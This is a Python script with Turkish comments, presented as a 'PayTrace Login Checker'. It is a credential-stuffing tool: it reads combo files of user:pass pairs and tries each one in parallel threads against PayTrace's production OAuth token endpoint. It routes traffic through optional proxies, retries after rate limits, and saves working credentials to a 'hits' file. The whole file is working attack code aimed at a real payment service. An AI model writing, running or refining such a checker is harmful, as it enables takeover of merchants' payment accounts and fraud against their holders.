#!/usr/bin/env python3
"""
PayTrace Login Checker
User:Pass kontrolü - OAuth 2.0 password grant ile giriş doğrulama.
Tek hesap, toplu dosya ve interaktif modları destekler.
"""

import argparse
import json
import os
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── API URL'leri ──────────────────────────────────────────────────────
PROD_URL = "https://api.paytrace.com/oauth/token"
SANDBOX_URL = "https://api.sandbox.paytrace.com/oauth/token"

# ── Renkler ───────────────────────────────────────────────────────────
G = "\033[92m"   # yeşil
R = "\033[91m"   # kırmızı
Y = "\033[93m"   # sarı
C = "\033[96m"   # cyan
B = "\033[1m"    # bold
D = "\033[90m"   # dim
W = "\033[97m"   # beyaz
X = "\033[0m"    # reset

# ── Thread-safe state ────────────────────────────────────────────────
_lock = threading.Lock()


def _line(ch="─", n=56):
    return f"  {ch * n}"


def _banner():
    print(f"""
  {C}╔════════════════════════════════════════════════════════╗
  ║          PayTrace Login Checker  v2.0                 ║
  ║          User:Pass Giriş Kontrolü                     ║
  ╚════════════════════════════════════════════════════════╝{X}
  {D}Tarih : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{X}
""")


# ═══════════════════════════════════════════════════════════════════════
#  CORE: PayTrace OAuth Login
# ═══════════════════════════════════════════════════════════════════════

def paytrace_login(username, password, sandbox=False, timeout=30, proxy=None):
    """
    PayTrace OAuth 2.0 password grant ile giriş dene.
    Dönüş: dict  { ok, http_code, token, expires, error, latency_ms }
    """
    url = SANDBOX_URL if sandbox else PROD_URL
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
    }
    proxies = {"https": proxy, "http": proxy} if proxy else None

    try:
        t0 = time.time()
        resp = requests.post(
            url, headers=headers, data=data,
            timeout=timeout, proxies=proxies, verify=True,
        )
        ms = round((time.time() - t0) * 1000, 1)

        try:
            body = resp.json()
        except ValueError:
            return {"ok": False, "http_code": resp.status_code,
                    "error": "Yanıt JSON değil", "latency_ms": ms}

        if resp.status_code == 200 and "access_token" in body:
            return {
                "ok": True,
                "http_code": 200,
                "token": body["access_token"],
                "token_type": body.get("token_type", "Bearer"),
                "expires": body.get("expires_in"),
                "latency_ms": ms,
            }

        if resp.status_code == 429:
            return {"ok": False, "http_code": 429,
                    "error": "Rate limit - çok fazla istek", "latency_ms": ms}

        err = body.get("error_description",
                       body.get("error",
                                body.get("message", str(body)[:120])))
        return {"ok": False, "http_code": resp.status_code,
                "error": err, "latency_ms": ms}

    except requests.exceptions.SSLError:
        return {"ok": False, "http_code": None, "error": "SSL sertifika hatası"}
    except requests.exceptions.ProxyError:
        return {"ok": False, "http_code": None, "error": "Proxy hatası"}
    except requests.exceptions.Timeout:
        return {"ok": False, "http_code": None, "error": "Zaman aşımı"}
    except requests.exceptions.ConnectionError as e:
        s = str(e)
        if "NameResolution" in s or "getaddrinfo" in s:
            return {"ok": False, "http_code": None, "error": "DNS çözülemedi"}
        if "Connection refused" in s:
            return {"ok": False, "http_code": None, "error": "Bağlantı reddedildi"}
        return {"ok": False, "http_code": None, "error": f"Bağlantı hatası: {s[:80]}"}
    except Exception as e:
        return {"ok": False, "http_code": None, "error": f"{type(e).__name__}: {e}"}


def paytrace_login_retry(username, password, sandbox=False,
                         retries=2, timeout=30, proxy=None):
    """Retry destekli login. Rate-limit ve hatalarda otomatik bekler."""
    for attempt in range(retries + 1):
        result = paytrace_login(username, password, sandbox, timeout, proxy)

        if result["ok"]:
            return result

        if result.get("http_code") == 429 and attempt < retries:
            time.sleep(5 * (attempt + 1))
            continue

        if result.get("http_code") is None and attempt < retries:
            time.sleep(2 * (attempt + 1))
            continue

        return result

    return result


# ═══════════════════════════════════════════════════════════════════════
#  SUNUCU BAĞLANTI TESTİ
# ═══════════════════════════════════════════════════════════════════════

def check_server(sandbox=False, proxy=None, timeout=10):
    """PayTrace sunucusuna erişim kontrolü."""
    url = SANDBOX_URL if sandbox else PROD_URL
    base = url.rsplit("/", 2)[0]
    proxies = {"https": proxy, "http": proxy} if proxy else None

    try:
        t0 = time.time()
        resp = requests.get(base, timeout=timeout, proxies=proxies,
                            verify=True, allow_redirects=True)
        ms = round((time.time() - t0) * 1000, 1)
        return True, f"HTTP {resp.status_code}", ms
    except requests.exceptions.SSLError:
        return False, "SSL hatası", 0
    except requests.exceptions.ProxyError:
        return False, "Proxy hatası", 0
    except requests.exceptions.Timeout:
        return False, "Zaman aşımı", 0
    except requests.exceptions.ConnectionError:
        return False, "Bağlantı hatası", 0
    except Exception as e:
        return False, str(e)[:60], 0


# ═══════════════════════════════════════════════════════════════════════
#  DOSYA OKUMA
# ═══════════════════════════════════════════════════════════════════════

def parse_combo_line(line):
    """Tek satırı parse et: user:pass / user pass / user|pass"""
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    for sep in (":", "|", " ", "\t"):
        if sep in line:
            parts = line.split(sep, 1)
            u, p = parts[0].strip(), parts[1].strip()
            if u and p:
                return u, p
    return None


def load_combo_file(path):
    """Combo dosyasını oku, (user, pass) listesi döndür."""
    combos = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            parsed = parse_combo_line(line)
            if parsed:
                combos.append(parsed)
    return combos


# ═══════════════════════════════════════════════════════════════════════
#  TEK HESAP KONTROLÜ
# ═══════════════════════════════════════════════════════════════════════

def check_single(username, password, sandbox=False,
                 retries=2, timeout=30, proxy=None):
    """Tek bir hesabı kontrol et ve sonucu ekrana bas."""
    env = "SANDBOX" if sandbox else "PRODUCTION"

    print(f"  {B}HESAP KONTROLÜ{X}")
    print(_line())
    print(f"  Kullanıcı : {W}{username}{X}")
    print(f"  Ortam     : {C}{env}{X}")
    print(_line())

    # Sunucu kontrolü
    print(f"  Sunucu    : ", end="", flush=True)
    ok, detail, ms = check_server(sandbox, proxy, timeout)
    if ok:
        print(f"{G}Erişilebilir{X} {D}({detail}, {ms}ms){X}")
    else:
        print(f"{R}Erişilemedi ({detail}){X}")
        print(f"\n  {R}Sunucuya bağlanılamıyor. İşlem durduruluyor.{X}")
        print(f"  {D}Öneri: İnternet bağlantınızı kontrol edin veya --proxy kullanın{X}\n")
        return None

    # Giriş denemesi
    print(f"  Giriş     : ", end="", flush=True)
    result = paytrace_login_retry(username, password, sandbox, retries, timeout, proxy)

    if result["ok"]:
        token_short = result["token"][:20] + "..." + result["token"][-6:]
        print(f"{G}BAŞARILI ✓{X} {D}({result['latency_ms']}ms){X}")
        print(_line())
        print(f"  {G}[HIT]{X} Hesap aktif ve çalışıyor!")
        print(_line("─", 56))
        print(f"  Token     : {D}{token_short}{X}")
        print(f"  Token Tür : {result['token_type']}")
        print(f"  Geçerlilik: {result['expires']} saniye")
    else:
        http_str = f" HTTP {result['http_code']}" if result.get("http_code") else ""
        print(f"{R}BAŞARISIZ ✗{X}{D}{http_str}{X}")
        print(_line())
        print(f"  {R}[FAIL]{X} Giriş yapılamadı")
        print(f"  Sebep     : {result['error']}")

    print(_line())
    print()
    return result


# ═══════════════════════════════════════════════════════════════════════
#  TOPLU HESAP KONTROLÜ
# ═══════════════════════════════════════════════════════════════════════

def check_batch(combos, sandbox=False, threads=3,
                retries=2, timeout=30, proxy=None, output=None):
    """Combo listesini paralel kontrol et."""
    env = "SANDBOX" if sandbox else "PRODUCTION"
    total = len(combos)

    hits_file = output or f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    print(f"  {B}TOPLU HESAP KONTROLÜ{X}")
    print(_line())
    print(f"  Ortam     : {C}{env}{X}")
    print(f"  Toplam    : {W}{total}{X} hesap")
    print(f"  Thread    : {threads}")
    print(f"  Çıktı     : {hits_file}")
    print(_line())

    # Sunucu kontrolü
    print(f"  Sunucu    : ", end="", flush=True)
    ok, detail, ms = check_server(sandbox, proxy, timeout)
    if ok:
        print(f"{G}Erişilebilir{X} {D}({detail}, {ms}ms){X}")
    else:
        print(f"{R}Erişilemedi ({detail}){X}")
        print(f"\n  {R}Sunucuya bağlanılamıyor. İşlem durduruluyor.{X}\n")
        return None

    print(_line())
    print()

    # İstatistikler
    stats = {"hit": 0, "bad": 0, "err": 0, "done": 0}
    all_results = []

    def _progress():
        done = stats["done"]
        pct = done / total * 100
        bar_w = 35
        filled = int(bar_w * done / total)
        bar = "█" * filled + "░" * (bar_w - filled)
        h = f"{G}Hit:{stats['hit']}{X}"
        b = f"{R}Bad:{stats['bad']}{X}"
        e = f"{Y}Err:{stats['err']}{X}"
        sys.stdout.write(f"\r  [{bar}] {pct:5.1f}%  {h}  {b}  {e}  ")
        sys.stdout.flush()

    def _worker(user, passwd):
        res = paytrace_login_retry(user, passwd, sandbox, retries, timeout, proxy)
        with _lock:
            stats["done"] += 1
            res["user"] = user
            res["pass"] = passwd

            if res["ok"]:
                stats["hit"] += 1
                all_results.append(res)
                with open(hits_file, "a", encoding="utf-8") as f:
                    f.write(f"{user}:{passwd}\n")
                token_short = res["token"][:16] + "..."
                print(f"\r  {G}[HIT]{X} {user}:{passwd}  "
                      f"{D}token={token_short}{X}                    ")
            elif res.get("http_code") and res["http_code"] < 500:
                stats["bad"] += 1
            else:
                stats["err"] += 1

            _progress()
        return res

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(_worker, u, p): (u, p) for u, p in combos}
        for f in as_completed(futures):
            f.result()

    # Sonuç raporu
    print("\n")
    print(_line("═", 56))
    print(f"  {B}SONUÇLAR{X}")
    print(_line("═", 56))
    print(f"  Toplam    : {total}")
    print(f"  {G}Hit       : {stats['hit']}{X}")
    print(f"  {R}Bad       : {stats['bad']}{X}")
    print(f"  {Y}Error     : {stats['err']}{X}")

    if stats["hit"] > 0:
        print(f"\n  {G}Başarılı hesaplar kaydedildi -> {hits_file}{X}")

    if stats["err"] > 0:
        print(f"\n  {Y}Hata olan hesaplar için tekrar deneyebilirsiniz{X}")

    print(_line("═", 56))
    print()
    return stats


# ═══════════════════════════════════════════════════════════════════════
#  İNTERAKTİF MOD
# ═══════════════════════════════════════════════════════════════════════

def interactive():
    """İnteraktif mod - menü ile kontrol."""
    while True:
        print(f"\n  {B}═══ MENÜ ══════════════════════════════════════════{X}")
        print(f"  {C}1{X}  Tek Hesap Kontrol (user + pass gir)")
        print(f"  {C}2{X}  Dosyadan Toplu Kontrol")
        print(f"  {C}3{X}  Sunucu Bağlantı Testi")
        print(f"  {C}q{X}  Çıkış")
        print(f"  {B}═══════════════════════════════════════════════════{X}")

        ch = input(f"\n  Seçim [{C}1-3/q{X}]: ").strip().lower()

        if ch == "1":
            print()
            user = input(f"  {W}Kullanıcı adı:{X} ").strip()
            passwd = input(f"  {W}Şifre        :{X} ").strip()
            if not user or not passwd:
                print(f"  {R}Kullanıcı adı ve şifre boş olamaz!{X}")
                continue
            sb = input(f"  Sandbox mu? ({C}e{X}/h) [h]: ").strip().lower() == "e"
            print()
            check_single(user, passwd, sandbox=sb)

        elif ch == "2":
            print()
            path = input(f"  {W}Dosya yolu:{X} ").strip()
            if not path:
                print(f"  {R}Dosya yolu boş!{X}")
                continue
            if not os.path.isfile(path):
                print(f"  {R}Dosya bulunamadı: {path}{X}")
                continue
            combos = load_combo_file(path)
            if not combos:
                print(f"  {R}Dosyada geçerli hesap yok!{X}")
                print(f"  {D}Format: user:pass veya user pass (her satır){X}")
                continue
            print(f"  {D}{len(combos)} hesap bulundu{X}")
            sb = input(f"  Sandbox mu? ({C}e{X}/h) [h]: ").strip().lower() == "e"
            th = input(f"  Thread sayısı [{C}3{X}]: ").strip()
            th = int(th) if th.isdigit() and int(th) > 0 else 3
            print()
            check_batch(combos, sandbox=sb, threads=th)

        elif ch == "3":
            print()
            print(f"  {B}SUNUCU DURUMU{X}")
            print(_line())
            for name, sb in [("Production", False), ("Sandbox", True)]:
                ok, detail, ms = check_server(sandbox=sb)
                if ok:
                    print(f"  {G}✓{X} {name:<12} {G}Erişilebilir{X} {D}({detail}, {ms}ms){X}")
                else:
                    print(f"  {R}✗{X} {name:<12} {R}{detail}{X}")
            print(_line())

        elif ch == "q":
            print(f"\n  {D}Çıkış...{X}\n")
            break

        else:
            print(f"  {R}Geçersiz seçim!{X}")


# ═══════════════════════════════════════════════════════════════════════
#  CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="PayTrace Login Checker - User:Pass Giriş Kontrolü",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{B}Kullanım Örnekleri:{X}
  %(prog)s                                    İnteraktif menü
  %(prog)s -u admin -p secret123              Tek hesap kontrol
  %(prog)s -u admin -p secret123 --sandbox    Sandbox ortamında kontrol
  %(prog)s -f combo.txt                       Dosyadan toplu kontrol
  %(prog)s -f combo.txt -t 10                 10 thread ile toplu kontrol
  %(prog)s -f combo.txt -o valid.txt          Sonuçları valid.txt'e kaydet
  %(prog)s -f combo.txt --proxy socks5://127.0.0.1:1080
  %(prog)s --test                             Sadece sunucu bağlantı testi

{B}Dosya formatı:{X} (her satırda)
  user:pass
  user pass
  user|pass
""",
    )

    parser.add_argument("-u", "--username", help="Kullanıcı adı")
    parser.add_argument("-p", "--password", help="Şifre")
    parser.add_argument("-f", "--file", help="Combo dosyası (user:pass)")
    parser.add_argument("-t", "--threads", type=int, default=3,
                        help="Thread sayısı (varsayılan: 3)")
    parser.add_argument("-o", "--output",
                        help="Hit sonuçlarını kaydet (varsayılan: hits_<tarih>.txt)")
    parser.add_argument("--retries", type=int, default=2,
                        help="Hata durumunda tekrar deneme (varsayılan: 2)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="İstek zaman aşımı saniye (varsayılan: 30)")
    parser.add_argument("--sandbox", action="store_true",
                        help="Sandbox ortamını kullan")
    parser.add_argument("--proxy",
                        help="Proxy adresi (ör: socks5://127.0.0.1:1080)")
    parser.add_argument("--json", action="store_true",
                        help="Sonuçları JSON formatında göster")
    parser.add_argument("--test", action="store_true",
                        help="Sadece sunucu bağlantı testi")

    args = parser.parse_args()

    _banner()

    # ── Sunucu testi ──
    if args.test:
        print(f"  {B}SUNUCU BAĞLANTI TESTİ{X}")
        print(_line())
        for name, sb in [("Production", False), ("Sandbox", True)]:
            ok, detail, ms = check_server(sandbox=sb, proxy=args.proxy,
                                          timeout=args.timeout)
            if ok:
                print(f"  {G}✓{X} {name:<12} {G}Erişilebilir{X} {D}({detail}, {ms}ms){X}")
            else:
                print(f"  {R}✗{X} {name:<12} {R}{detail}{X}")
        print(_line())
        print()
        return

    # ── Tek hesap ──
    if args.username:
        if not args.password:
            parser.error("Şifre gerekli: -p PASSWORD")
        result = check_single(
            args.username, args.password,
            sandbox=args.sandbox, retries=args.retries,
            timeout=args.timeout, proxy=args.proxy,
        )
        if args.json and result:
            safe = {k: v for k, v in result.items() if k != "token"}
            if result.get("ok"):
                safe["token_preview"] = result["token"][:20] + "..."
            print(json.dumps(safe, indent=2, ensure_ascii=False))
        return

    # ── Dosyadan toplu ──
    if args.file:
        if not os.path.isfile(args.file):
            print(f"  {R}Dosya bulunamadı: {args.file}{X}\n")
            sys.exit(1)
        combos = load_combo_file(args.file)
        if not combos:
            print(f"  {R}Dosyada geçerli hesap bulunamadı!{X}")
            print(f"  {D}Format: user:pass veya user pass (her satır){X}\n")
            sys.exit(1)
        stats = check_batch(
            combos, sandbox=args.sandbox, threads=args.threads,
            retries=args.retries, timeout=args.timeout,
            proxy=args.proxy, output=args.output,
        )
        if args.json and stats:
            print(json.dumps(stats, indent=2, ensure_ascii=False))
        return

    # ── İnteraktif mod ──
    interactive()


if __name__ == "__main__":
    main()
